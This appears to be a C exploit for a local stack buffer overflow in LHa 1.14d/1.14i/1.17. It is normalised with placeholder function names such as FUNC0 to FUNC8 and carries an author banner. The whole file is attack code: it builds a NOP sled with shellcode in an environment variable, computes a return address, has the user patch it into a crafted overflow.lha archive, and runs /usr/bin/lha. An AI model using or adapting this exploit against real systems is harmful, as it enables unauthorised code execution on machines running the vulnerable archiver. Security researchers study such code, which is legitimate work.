#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  addict ;

/* Variables and functions */
 int BUFFERSIZE ; 
 int FEED ; 
 int /*<<< orphan*/  PATH ; 
 int /*<<< orphan*/  PROG ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,char*,char*,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 int /*<<< orphan*/  FUNC2 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC3 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC4 (char*) ; 
 int /*<<< orphan*/  FUNC5 (char*,...) ; 
 int /*<<< orphan*/  FUNC6 (char*) ; 
 char* shellcode ; 
 int FUNC7 (char*) ; 

int FUNC8(int argc, char *argv[])
    
{ 
        if( argc < 2 )
        { FUNC5("[-] Enter The Full Of the overflow.lha \n");
          FUNC1(-1);
        }



        FUNC5("--------------------------------------------------\n");
	FUNC5("| Author : N4rK07IX\n");
        FUNC5("| Found by : Ulf Ha'rnhammar\n");
	FUNC5("| LHa 1.14d 1.14i 1.17 Local Lame Stack Overflow Sploit\n");
	FUNC5("| narkotix@linuxmail.org\n");
	FUNC5("|--------------------------------------------------\n");
	        
	char buffer[BUFFERSIZE];   
	char addict[FEED];
	
	int i,
	    *adr_pointer,
	    *addict_pointer;
	    
	FUNC3(addict,0x90,sizeof(addict));
        FUNC2(&addict[FEED-FUNC7(shellcode)],shellcode,FUNC7(shellcode)); 
        FUNC2(addict,"ADDICT=",7);
        FUNC6(addict);
	
	unsigned long ret = 0XBFFFFFFA -FUNC7("/usr/bin/lha") - FUNC7(addict);
	FUNC5("[+] RET ADDRESS = 0x%x\n",ret);
        
         char l =  (ret & 0x000000ff);
         char a =  (ret & 0x0000ff00) >> 8;
         char m =  (ret & 0x00ff0000) >> 16;
         char e =  (ret & 0xff000000) >> 24;

        



        FUNC5("[!] Paste These ASCII 4 bytes Ret Adress to the XXXX in the file overflow.lha\n");
        FUNC5("[!] ASCII RET ADDR = %c%c%c%c\n",l,a,m,e);
	FUNC5("[+] Exploiting the buffer..\n");
        adr_pointer = (int *)(buffer);
	
	for(i = 0 ; i < BUFFERSIZE ; i += 4)
	*adr_pointer++ = ret;
	FUNC0(PATH,PROG,"x",argv[1],NULL);
	if(!&execl);
	FUNC4("execl()");
	FUNC5("[+] Done B4by\n");
	
	return 0;
}